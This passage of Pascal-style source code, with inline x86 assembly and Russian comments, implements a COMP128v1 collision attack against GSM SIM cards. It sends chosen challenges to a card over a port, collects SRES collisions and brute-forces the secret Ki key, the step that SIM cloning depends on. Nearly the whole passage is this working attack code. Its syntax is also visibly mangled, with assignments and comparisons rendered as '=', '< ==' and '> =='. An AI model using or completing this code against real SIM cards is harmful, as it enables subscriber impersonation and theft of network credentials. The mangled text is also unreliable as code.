	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].B2;
	   WorkRes[0][3]  =  DataBuffer^[Next].BD;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].B2;
	   WorkRes[1][3]  =  Search[CalcByte].BD;
	  end;
	 end;
	 ResBuffer2^[Res2_Uk].Data  =  WorkData;
	 ResBuffer2^[Res2_Uk].Res  =  WorkRes;
	 ResBuffer2^[Res2_Uk].Nomer  =  CalcByte;
	 Res2_Uk  =  Res2_Uk+1;
	end;
	Prev  =  Next;
        Next  =  DataBuffer^[Next].Next;
       end;
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       DataBuffer^[Prev].Next  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end;
     end;
    end;      
   end;   
   LWriteln('Found '+IntToStr(Res2_Uk)+' possible 4-bytes pair groups (2).',2);
   {Ищем восьмерки, которые после 3-х раундов отличаются 1 байтом}
   Res81_Uk  =  0;
   FillChar(ResCheck[0][0][0],4*64*64,1);
   for I  =  0 to 5 do begin
    for J  =  0 to 3 do begin
     ResCheck[J][SearchPair8Table1[I][0]][SearchPair8Table1[I][1]]  =  0;
     ResCheck[J][SearchPair8Table1[I][1]][SearchPair8Table1[I][0]]  =  0;
    end;
   end;
   FillChar(SearchPairArray[0],4,0);
   for P1  =  0 to (Res1_Uk-1) do begin
    for P2  =  0 to (Res2_Uk-1) do begin
     if (ResBuffer1^[P1].Nomer == ResBuffer2^[P2].Nomer) then begin
      PN  =  ResBuffer1^[P1].Nomer;
      if SearchPairArray[PN]<12 then begin
       Concat8[0]  =  Emu_3R_v1(ResBuffer1^[P1].Res[0][PN],ResBuffer2^[P2].Res[0][PN]);
       Concat8[1]  =  Emu_3R_v1(ResBuffer1^[P1].Res[0][PN],ResBuffer2^[P2].Res[1][PN]);         
       Concat8[2]  =  Emu_3R_v1(ResBuffer1^[P1].Res[1][PN],ResBuffer2^[P2].Res[0][PN]);
       Concat8[3]  =  Emu_3R_v1(ResBuffer1^[P1].Res[1][PN],ResBuffer2^[P2].Res[1][PN]);
       for I  =  0 to 2 do begin
        for J  =  (I+1) to 3 do begin
         if (Concat8[I][0] == Concat8[J][0]) and (Concat8[I][1]<>Concat8[J][1]) then begin
 	  if (ResCheck[PN][Concat8[I][1]][Concat8[J][1]]) == 0 then begin
 	   ResBuffer81^[Res81_Uk].Data[0][0]  =  ResBuffer1^[P1].Data[((I and $02) shr 1)];
	   ResBuffer81^[Res81_Uk].Data[0][1]  =  ResBuffer2^[P2].Data[(I and $01)];
	   ResBuffer81^[Res81_Uk].Data[1][0]  =  ResBuffer1^[P1].Data[((J and $02) shr 1)];
	   ResBuffer81^[Res81_Uk].Data[1][1]  =  ResBuffer2^[P2].Data[(J and $01)];
	   CPair1[0]  =  CData[0];
	   CPair1[1]  =  CData[4];
	   CPair2[0]  =  CData[2];
	   CPair2[1]  =  CData[6];
	   ResBuffer81^[Res81_Uk].Res[0]  =  Emu_3Rounds_v1(CPair1,CPair2,
	    ResBuffer81^[Res81_Uk].Data[0][0],ResBuffer81^[Res81_Uk].Data[0][1]);
	   ResBuffer81^[Res81_Uk].Res[1]  =  Emu_3Rounds_v1(CPair1,CPair2,
	    ResBuffer81^[Res81_Uk].Data[1][0],ResBuffer81^[Res81_Uk].Data[1][1]);
	   ResBuffer81^[Res81_Uk].Nomer  =  PN; 
	   Res81_Uk  =  Res81_Uk+1;
	   ResCheck[PN][Concat8[I][1]][Concat8[J][1]]  =  1;
	   SearchPairArray[PN]  =  SearchPairArray[PN]+1;
	  end; 
	 end; 
	end; 
       end;
      end; 
     end;
    end;
   end;     
   LWriteln('Found '+IntToStr(Res81_Uk)+' possible 8-bytes pair groups.',2);
   {Третья пара}
   FillChar(IndexBuffer^[0][0],4*128*128,$FF);
   SD_Uk  =  0;
   Res1_Uk  =  0;
   for I  =  0 to $FF do begin
    R0_after_R1[I][0]  =  Comp128v1_T0[CData[1]+2*I];
    R0_after_R1[I][1]  =  Comp128v1_T0[2*CData[1]+I];
   end;    
   for I  =  0 to $FF do begin
    R8_after_R1[I][0]  =  Comp128v1_T0[CData[5]+2*I];
    R8_after_R1[I][1]  =  Comp128v1_T0[2*CData[5]+I];
   end;    
   for CurPair[0]  =  0 to $FF do begin
    for CurPair[1]  =  0 to $FF do begin
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
     Search[0].BD  =  PairRes[0];
     Search[1].B0  =  PairRes[0];
     Search[2].B0  =  PairRes[0];
     Search[3].B0  =  PairRes[0];
     Search[0].B0  =  PairRes[1];
     Search[1].BD  =  PairRes[1];
     Search[2].B1  =  PairRes[1];
     Search[3].B1  =  PairRes[1];
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
     Search[0].B1  =  PairRes[0];
     Search[1].B1  =  PairRes[0];
     Search[2].BD  =  PairRes[0];
     Search[3].B2  =  PairRes[0];
     Search[0].B2  =  PairRes[1];
     Search[1].B2  =  PairRes[1];
     Search[2].B2  =  PairRes[1];
     Search[3].BD  =  PairRes[1];
     for CalcByte  =  0 to 3 do begin
      if (IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1] == -1) then begin
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1]  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end
      else begin
       Next  =  IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1];
       Prev  =  -1;
       while Next<>-1 do begin
	if (DataBuffer^[Next].B2 == Search[CalcByte].B2) and (DataBuffer^[Next].Nomer == CalcByte) and
	 (DataBuffer^[Next].BD<>Search[CalcByte].BD) then begin
	 WorkData[0]  =  DataBuffer^[Next].Pair;
	 WorkData[1]  =  CurPair;
	 case CalcByte of
	  0:begin
	   WorkRes[0][0]  =  DataBuffer^[Next].BD;
	   WorkRes[0][1]  =  Search[CalcByte].B0;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].BD;
	   WorkRes[1][1]  =  Search[CalcByte].B0;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  1:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  DataBuffer^[Next].BD;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].BD;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  2:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].BD;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].BD;
	   WorkRes[1][3]  =  Search[CalcByte].B2;	   
	  end;
	  3:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].B2;
	   WorkRes[0][3]  =  DataBuffer^[Next].BD;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].B2;
	   WorkRes[1][3]  =  Search[CalcByte].BD;
	  end;
	 end;
	 ResBuffer1^[Res1_Uk].Data  =  WorkData;
	 ResBuffer1^[Res1_Uk].Res  =  WorkRes;
	 ResBuffer1^[Res1_Uk].Nomer  =  CalcByte;
	 Res1_Uk  =  Res1_Uk+1;
	end;
	Prev  =  Next;
        Next  =  DataBuffer^[Next].Next;
       end;
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       DataBuffer^[Prev].Next  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end;
     end;
    end;      
   end;   
   LWriteln('Found '+IntToStr(Res1_Uk)+' possible 4-bytes pair groups (3).',2);
   {Четвертая пара}
   FillChar(IndexBuffer^[0][0],4*128*128,$FF);
   SD_Uk  =  0;
   Res2_Uk  =  0;
   for I  =  0 to $FF do begin
    R0_after_R1[I][0]  =  Comp128v1_T0[CData[3]+2*I];
    R0_after_R1[I][1]  =  Comp128v1_T0[2*CData[3]+I];
   end;    
   for I  =  0 to $FF do begin
    R8_after_R1[I][0]  =  Comp128v1_T0[CData[7]+2*I];
    R8_after_R1[I][1]  =  Comp128v1_T0[2*CData[7]+I];
   end;    
   for CurPair[0]  =  0 to $FF do begin
    for CurPair[1]  =  0 to $FF do begin
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][0]+2*R8_after_R1[CurPair[1]][0]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][0]+R8_after_R1[CurPair[1]][0]];
     Search[0].BD  =  PairRes[0];
     Search[1].B0  =  PairRes[0];
     Search[2].B0  =  PairRes[0];
     Search[3].B0  =  PairRes[0];
     Search[0].B0  =  PairRes[1];
     Search[1].BD  =  PairRes[1];
     Search[2].B1  =  PairRes[1];
     Search[3].B1  =  PairRes[1];
     PairRes[0]  =  Comp128v1_T1[R0_after_R1[CurPair[0]][1]+2*R8_after_R1[CurPair[1]][1]];
     PairRes[1]  =  Comp128v1_T1[2*R0_after_R1[CurPair[0]][1]+R8_after_R1[CurPair[1]][1]];
     Search[0].B1  =  PairRes[0];
     Search[1].B1  =  PairRes[0];
     Search[2].BD  =  PairRes[0];
     Search[3].B2  =  PairRes[0];
     Search[0].B2  =  PairRes[1];
     Search[1].B2  =  PairRes[1];
     Search[2].B2  =  PairRes[1];
     Search[3].BD  =  PairRes[1];
     for CalcByte  =  0 to 3 do begin
      if (IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1] == -1) then begin
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1]  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end
      else begin
       Next  =  IndexBuffer^[Search[CalcByte].B0][Search[CalcByte].B1];
       Prev  =  -1;
       while Next<>-1 do begin
	if (DataBuffer^[Next].B2 == Search[CalcByte].B2) and (DataBuffer^[Next].Nomer == CalcByte) and
	 (DataBuffer^[Next].BD<>Search[CalcByte].BD) then begin
	 WorkData[0]  =  DataBuffer^[Next].Pair;
	 WorkData[1]  =  CurPair;
	 case CalcByte of
	  0:begin
	   WorkRes[0][0]  =  DataBuffer^[Next].BD;
	   WorkRes[0][1]  =  Search[CalcByte].B0;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].BD;
	   WorkRes[1][1]  =  Search[CalcByte].B0;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  1:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  DataBuffer^[Next].BD;
	   WorkRes[0][2]  =  Search[CalcByte].B1;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].BD;
	   WorkRes[1][2]  =  Search[CalcByte].B1;
	   WorkRes[1][3]  =  Search[CalcByte].B2;
	  end;
	  2:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].BD;
	   WorkRes[0][3]  =  DataBuffer^[Next].B2;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].BD;
	   WorkRes[1][3]  =  Search[CalcByte].B2;	   
	  end;
	  3:begin
	   WorkRes[0][0]  =  Search[CalcByte].B0;
	   WorkRes[0][1]  =  Search[CalcByte].B1;
	   WorkRes[0][2]  =  DataBuffer^[Next].B2;
	   WorkRes[0][3]  =  DataBuffer^[Next].BD;
	   WorkRes[1][0]  =  Search[CalcByte].B0;
	   WorkRes[1][1]  =  Search[CalcByte].B1;
	   WorkRes[1][2]  =  Search[CalcByte].B2;
	   WorkRes[1][3]  =  Search[CalcByte].BD;
	  end;
	 end;
	 ResBuffer2^[Res2_Uk].Data  =  WorkData;
	 ResBuffer2^[Res2_Uk].Res  =  WorkRes;
	 ResBuffer2^[Res2_Uk].Nomer  =  CalcByte;
	 Res2_Uk  =  Res2_Uk+1;
	end;
	Prev  =  Next;
        Next  =  DataBuffer^[Next].Next;
       end;
       DataBuffer^[SD_Uk].B2  =  Search[CalcByte].B2;
       DataBuffer^[SD_Uk].Nomer  =  CalcByte;
       DataBuffer^[SD_Uk].BD  =  Search[CalcByte].BD;
       DataBuffer^[SD_Uk].Pair  =  CurPair;
       DataBuffer^[SD_Uk].Next  =  -1;
       DataBuffer^[Prev].Next  =  SD_Uk;
       SD_Uk  =  SD_Uk+1;
      end;
     end;
    end;      
   end;   
   LWriteln('Found '+IntToStr(Res2_Uk)+' possible 4-bytes pair groups (4).',2);
   {Ищем восьмерки, которые после 3-х раундов отличаются 1 байтом}
   Res82_Uk  =  0;
   FillChar(ResCheck[0][0][0],4*64*64,1);
   for I  =  0 to 5 do begin
    for J  =  0 to 3 do begin
     ResCheck[J][SearchPair8Table2[I][0]][SearchPair8Table2[I][1]]  =  0;
     ResCheck[J][SearchPair8Table2[I][1]][SearchPair8Table2[I][0]]  =  0;
    end;
   end;
   FillChar(SearchPairArray[0],4,0);
   for P1  =  0 to (Res1_Uk-1) do begin
    for P2  =  0 to (Res2_Uk-1) do begin
     if (ResBuffer1^[P1].Nomer == ResBuffer2^[P2].Nomer) then begin
      PN  =  ResBuffer1^[P1].Nomer;
      if SearchPairArray[PN]<12 then begin
       Concat8[0]  =  Emu_3R_v1(ResBuffer1^[P1].Res[0][PN],ResBuffer2^[P2].Res[0][PN]);
       Concat8[1]  =  Emu_3R_v1(ResBuffer1^[P1].Res[0][PN],ResBuffer2^[P2].Res[1][PN]);         
       Concat8[2]  =  Emu_3R_v1(ResBuffer1^[P1].Res[1][PN],ResBuffer2^[P2].Res[0][PN]);
       Concat8[3]  =  Emu_3R_v1(ResBuffer1^[P1].Res[1][PN],ResBuffer2^[P2].Res[1][PN]);
       for I  =  0 to 2 do begin
        for J  =  (I+1) to 3 do begin
         if (Concat8[I][0] == Concat8[J][0]) and (Concat8[I][1]<>Concat8[J][1]) then begin
 	  if (ResCheck[PN][Concat8[I][1]][Concat8[J][1]]) == 0 then begin
 	   ResBuffer82^[Res82_Uk].Data[0][0]  =  ResBuffer1^[P1].Data[((I and $02) shr 1)];
	   ResBuffer82^[Res82_Uk].Data[0][1]  =  ResBuffer2^[P2].Data[(I and $01)];
	   ResBuffer82^[Res82_Uk].Data[1][0]  =  ResBuffer1^[P1].Data[((J and $02) shr 1)];
	   ResBuffer82^[Res82_Uk].Data[1][1]  =  ResBuffer2^[P2].Data[(J and $01)];
	   CPair1[0]  =  CData[1];
	   CPair1[1]  =  CData[5];
	   CPair2[0]  =  CData[3];
	   CPair2[1]  =  CData[7];
	   ResBuffer82^[Res82_Uk].Res[0]  =  Emu_3Rounds_v1(CPair1,CPair2,
	    ResBuffer82^[Res82_Uk].Data[0][0],ResBuffer82^[Res82_Uk].Data[0][1]);
	   ResBuffer82^[Res82_Uk].Res[1]  =  Emu_3Rounds_v1(CPair1,CPair2,
	    ResBuffer82^[Res82_Uk].Data[1][0],ResBuffer82^[Res82_Uk].Data[1][1]);
	   ResBuffer82^[Res82_Uk].Nomer  =  PN; 
	   Res82_Uk  =  Res82_Uk+1;
	   ResCheck[PN][Concat8[I][1]][Concat8[J][1]]  =  1;
	   SearchPairArray[PN]  =  SearchPairArray[PN]+1;
	  end; 
	 end; 
	end; 
       end;
      end; 
     end;
    end;
   end;     
   LWriteln('Found '+IntToStr(Res82_Uk)+' possible 8-bytes pair groups.',2);
   {Ищем шестнадцатерки, которые после 4-х раундов отличаются 1 байтом}
   Res_Uk  =  0;
   FillChar(ResCheck16[0][0][0],4*32*32,0);
   for P1  =  0 to (Res81_Uk-1) do begin
    for P2  =  0 to (Res82_Uk-1) do begin
     if (ResBuffer81^[P1].Nomer == ResBuffer82^[P2].Nomer) then begin
      PN  =  (ResBuffer81^[P1].Nomer*2)+1;
      Concat16[0]  =  Emu_4R_v1(ResBuffer81^[P1].Res[0][PN],ResBuffer82^[P2].Res[0][PN]);
      Concat16[1]  =  Emu_4R_v1(ResBuffer81^[P1].Res[0][PN],ResBuffer82^[P2].Res[1][PN]);         
      Concat16[2]  =  Emu_4R_v1(ResBuffer81^[P1].Res[1][PN],ResBuffer82^[P2].Res[0][PN]);
      Concat16[3]  =  Emu_4R_v1(ResBuffer81^[P1].Res[1][PN],ResBuffer82^[P2].Res[1][PN]);
      for I  =  0 to 2 do begin
       for J  =  (I+1) to 3 do begin
        if (Concat16[I][0] == Concat16[J][0]) and (Concat16[I][1]<>Concat16[J][1]) then begin
	 {Проверим может ли данная 16-ка дать 4 common-байта}
	 AllFound  =  0;
	 for K  =  0 to 5 do begin
          if ((RandPair_5R_v1_Common[K].Pair[0] == Concat16[I][1]) and 
           (RandPair_5R_v1_Common[K].Pair[1] == Concat16[J][1])) or
           ((RandPair_5R_v1_Common[K].Pair[0] == Concat16[J][1]) and 
           (RandPair_5R_v1_Common[K].Pair[1] == Concat16[I][1])) then begin
           AllFound  =  1;
	   CommonUk  =  K;
           break;
          end;
         end;
         if AllFound == 1 then begin
	  if (ResCheck16[ResBuffer81^[P1].Nomer][Concat16[I][1]][Concat16[J][1]]) == 0 then begin
	   ResBuffer^[Res_Uk].Data[0][0]  =  ResBuffer81^[P1].Data[((I and $02) shr 1)][0];
	   ResBuffer^[Res_Uk].Data[0][2]  =  ResBuffer81^[P1].Data[((I and $02) shr 1)][1];
	   ResBuffer^[Res_Uk].Data[0][1]  =  ResBuffer82^[P2].Data[(I and $01)][0];
	   ResBuffer^[Res_Uk].Data[0][3]  =  ResBuffer82^[P2].Data[(I and $01)][1];
	   ResBuffer^[Res_Uk].Data[1][0]  =  ResBuffer81^[P1].Data[((J and $02) shr 1)][0];
	   ResBuffer^[Res_Uk].Data[1][2]  =  ResBuffer81^[P1].Data[((J and $02) shr 1)][1];
	   ResBuffer^[Res_Uk].Data[1][1]  =  ResBuffer82^[P2].Data[(J and $01)][0];
	   ResBuffer^[Res_Uk].Data[1][3]  =  ResBuffer82^[P2].Data[(J and $01)][1];
	   ResBuffer^[Res_Uk].Res[0]  =  Emu_4Rounds_v1(CData,ResBuffer^[Res_Uk].Data[0][0],
	    ResBuffer^[Res_Uk].Data[0][1],ResBuffer^[Res_Uk].Data[0][2],ResBuffer^[Res_Uk].Data[0][3]);
	   ResBuffer^[Res_Uk].Res[1]  =  Emu_4Rounds_v1(CData,ResBuffer^[Res_Uk].Data[1][0],
	    ResBuffer^[Res_Uk].Data[1][1],ResBuffer^[Res_Uk].Data[1][2],ResBuffer^[Res_Uk].Data[1][3]);
	   ResBuffer^[Res_Uk].Nomer  =  ResBuffer81^[P1].Nomer; 
	   ResBuffer^[Res_Uk].CommonUk  =  CommonUk; 
	   Res_Uk  =  Res_Uk+1;
	   ResCheck16[ResBuffer81^[P1].Nomer][Concat16[I][1]][Concat16[J][1]]  =  1;
	  end; 
	 end; 
	end; 
       end;
      end; 
     end;
    end;
   end;     
   LWriteln('Found '+IntToStr(Res_Uk)+' collision possible 16-bytes pair groups.',2);
   {Проверяем найденные группы - ищем коллизии}
   PrStep  =  false;
   Cur_Uk  =  0;
   while Cur_Uk< == (Res_Uk-1) do begin
    if ((PrStep == false) and (ResBuffer^[Cur_Uk].CommonUk< == 2)) or
     ((PrStep == true) and (ResBuffer^[Cur_Uk].CommonUk> == 3)) then begin
     LWriteln('Using two data groups:',2);
     LWriteln(' 1-st group: '+PrintHexPair(ResBuffer^[Cur_Uk].Data[0][0],false)+' '+
      PrintHexPair(ResBuffer^[Cur_Uk].Data[0][1],false)+' '+PrintHexPair(ResBuffer^[Cur_Uk].Data[0][2],false)+' '+
      PrintHexPair(ResBuffer^[Cur_Uk].Data[0][3],false)+', 4R-result: '+PrintHexData16(ResBuffer^[Cur_Uk].Res[0],false),2);
     LWriteln(' 2-nd group: '+PrintHexPair(ResBuffer^[Cur_Uk].Data[1][0],false)+' '+
      PrintHexPair(ResBuffer^[Cur_Uk].Data[1][1],false)+' '+PrintHexPair(ResBuffer^[Cur_Uk].Data[1][2],false)+' '+
      PrintHexPair(ResBuffer^[Cur_Uk].Data[1][3],false)+', 4R-result: '+PrintHexData16(ResBuffer^[Cur_Uk].Res[1],false),2);
     LWrite('Common bytes == ',2);
     for I  =  0 to 3 do begin
      LWrite(PrintHexByte(RandPair_5R_v1_Common[ResBuffer^[Cur_Uk].CommonUk].Commons[I]),2);
      if I<>3 then begin
       LWrite(',',2);
      end; 
     end;
     LWriteln('',2);     
     {Заполним массив CommonCheck}
     FillChar(CommonCheck[0],32,0);
     for I  =  0 to 3 do CommonCheck[RandPair_5R_v1_Common[ResBuffer^[Cur_Uk].CommonUk].Commons[I]]  =  1;
     {Ищем шестнадцать коллизий}
     AllFound  =  0;
     FillChar(Rand1[0],16,$0);
     FillChar(Rand2[0],16,$0);
     AKiPair  =  1-Pair;
     for I  =  0 to 3 do begin
      Rand1[AKiPair+(I*2)]  =  ResBuffer^[Cur_Uk].Data[0][I][0];
      Rand2[AKiPair+(I*2)]  =  ResBuffer^[Cur_Uk].Data[1][I][0];
      Rand1[AKiPair+(I*2)+8]  =  ResBuffer^[Cur_Uk].Data[0][I][1];
      Rand2[AKiPair+(I*2)+8]  =  ResBuffer^[Cur_Uk].Data[1][I][1];
     end;
     LWrite('->000',1);
     Uk  =  0;
     for CollCounter  =  0 to $FF do begin
      Rand1[Pair+8]  =  CollCounter;
      Rand2[Pair+8]  =  CollCounter;
      Uk  =  Uk+1;
      LWrite(#8#8#8,1);
      S  =  IntToStr(Uk);
      while Length(S)<3 do S  =  '0'+S;
      LWrite(S,1);
      while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes1)<>0) do ;
      if RetraceFile == '' then begin
       Result  =  Gsm(Port,Rand1,SRes1);
      end
      else begin
       Result  =  0;
       if Compare2Rands(RetraceRand,Rand1) == false then begin
        LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
        LWriteln('Expected   ==  '+PrintHexData16(Rand1,true),2);
        LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
        LWriteln('',2);
        A5Rv1  =  -1;
        return;
       end;
      end; 
      if (Result<>0) then begin
       A5Rv1  =  -1;
       return;
      end;
      Uk  =  Uk+1;
      LWrite(#8#8#8,1);
      S  =  IntToStr(Uk);
      while Length(S)<3 do S  =  '0'+S;
      LWrite(S,1);
      while (RetraceFile<>'') and (GetStringFromRetrace(RetraceRand,SRes2)<>0) do ;
      if RetraceFile == '' then begin
       Result  =  Gsm(Port,Rand2,SRes2);
      end
      else begin
       Result  =  0;
       if Compare2Rands(RetraceRand,Rand2) == false then begin
        LWriteln('ERROR! Invalid RAND in string '+IntToStr(RetraceStringCount)+' in retrace file!',2);
        LWriteln('Expected   ==  '+PrintHexData16(Rand2,true),2);
        LWriteln('Presented  ==  '+PrintHexData16(RetraceRand,true),2);
        LWriteln('',2);
        A5Rv1  =  -1;
        return;
       end;
      end; 
      if (Result<>0) then begin
       A5Rv1  =  -1;
       return;
      end;
      PrS  =  true;
      for J  =  0 to 11 do begin
       if SRes1[J]<>SRes2[J] then begin
        PrS  =  false;
        break;
       end;
      end;
      if PrS == true then begin
       CollB[AllFound]  =  CollCounter;
       AllFound  =  AllFound+1;
       LWriteln(chr($0D),1);
       LWriteln('Found '+IntToStr(AllFound)+' collision (00000000'+PrintHexByte(CollB[AllFound-1])+'000000).',2);
       if AllFound<16 then begin
        LWrite('->000',1);
       end;
      end;
      if AllFound == 16 then break;
     end;
     if AllFound == 16 then begin
      {Нашли шестнадцать коллизий}
      LWrite('Calculating KI variation... ',2);
      AllKiFound  =  0;
      FillChar(KiVar[1][0],32,0);
      CaseByte  =  ResBuffer^[Cur_Uk].Nomer;
      CaseBit0  =  (CaseByte and $01);
      CaseBit1  =  (CaseByte and $02) shr 1;
      
      {Собственно атака - калькуляция пары}
{$ASMMODE INTEL}
      asm
       push   eax
       push   ebx
       push   ecx
       push   edx
       push   esi
       push   edi
       
       lea    edi,CollB

       {dl  ==  L12Byte, dh  ==  L3Byte}
       mov    edx,00007F3Fh
@1:
       mov    ebx,000000FFh
@3:       
       {Цикл по CurPair[0]}
       lea    esi,Comp128v1_T0
       cmp    CaseBit1,0
       jnz    @4
       mov    ecx,[esi+ebx*4]
       jmp    @5
@4:
       mov    ecx,[esi+ebx*8]
@5:              
       push   ebx
       mov    ebx,000000FFh
@6:
       {Цикл по CurPair[1]}
       mov    eax,0000000Fh
@7:
       {Цикл по I}
       push   eax
       mov    eax,[edi+eax*4]
       cmp    CaseBit1,0
       jnz    @8
       lea    eax,[ebx+eax*2]
       jmp    @9       
@8:
       lea    eax,[eax+ebx*2]
@9:       
       lea    esi,Comp128v1_T0
       mov    eax,[esi+eax*4]
       {ecx  ==  ResR1_0, eax  ==  ResR1_1}
       cmp    CaseBit0,0
       jnz    @10
       lea    eax,[ecx+eax*2]
       jmp    @11   
@10:
       lea    eax,[eax+ecx*2]
@11:       
       lea    esi,Comp128v1_T1
       mov    eax,[esi+eax*4]
       mov    esi,edx
       shr    esi,8
       lea    eax,[esi+eax*2]
       lea    esi,Comp128v1_T2
       mov    eax,[esi+eax*4]
       lea    eax,[edx+eax*2]
       and    eax,000000ffh
       lea    esi,Comp128v1_T3
       mov    eax,[esi+eax*4]
       lea    esi,CommonCheck
       cmp    dword ptr [esi+eax*4],0
       pop    eax
       jnz    @12
       jmp    @13
@12:   
       dec    eax
       jns    @7       
       {Конец цикла по I}
@13:   
       {Проверка результата}
       cmp    eax,0FFFFFFFFh
       jnz    @14
       {Пара найдена}
       push   eax
       push   ebx
       push   esi
       mov    ebx,AllKiFound
       lea    esi,KiVar
       mov    al,ss:[esp+12]
       mov    ah,ss:[esp+4]
       cmp    ebx,0
       jz     @15
       xor    ecx,ecx
@16:
       cmp    ax,[esi+ecx*2]
       jz     @17
       inc    ecx
       cmp    ecx,ebx
       jnz    @16
@15:       
       mov    [esi+ebx*2],ax       
       inc    ebx
       mov    AllKiFound,ebx
@17:
       pop    esi
       pop    ebx
       pop    eax
@14:       
       dec    ebx
       jns    @6
       {Конец цикла по CurPair[1]}

       pop    ebx
       dec    ebx
       jns    @3
       {Конец цикла по CurPair[0]}
@2:
       dec    edx
       and    edx,0FFFFFF3Fh
       jns    @1
       
       pop    edi
       pop    esi
       pop    edx
       pop    ecx
       pop    ebx
       pop    eax
      end;      
      
      LWriteln(' '+IntToStr(AllKiFound)+' found.',2);
      {Проверяем полученный список вариантов Ki}
      if AllKiFound>0 then begin
       for I  =  1 to 16 do KiVarGood[I]  =  0;
       PrCollGood  =  false;
       for CurKiVar  =  1 to AllKiFound do begin
        LWrite('Checking KI pair '+PrintHexPair(KiVar[CurKiVar],false)+'...',2);
        PrUncol  =  false;
        for I  =  0 to 768 do begin
         if (KiVar[CurKiVar,0] == UncolPair_2R_v1[I,0]) and (KiVar[CurKiVar,1] == UncolPair_2R_v1[I,1]) then begin 
          PrUncol  =  true;
          break;
         end;
         if (UncolPair_2R_v1[I,0]>KiVar[CurKiVar,0]) or 
          ((UncolPair_2R_v1[I,0] == KiVar[CurKiVar,0]) and (UncolPair_2R_v1[I,1]>KiVar[CurKiVar,1])) then begin
          break; 
         end; 
        end;
        if PrUncol == true then begin
         KiVarGood[CurKiVar]  =  1;
         LWriteln('Uncollision.',2);
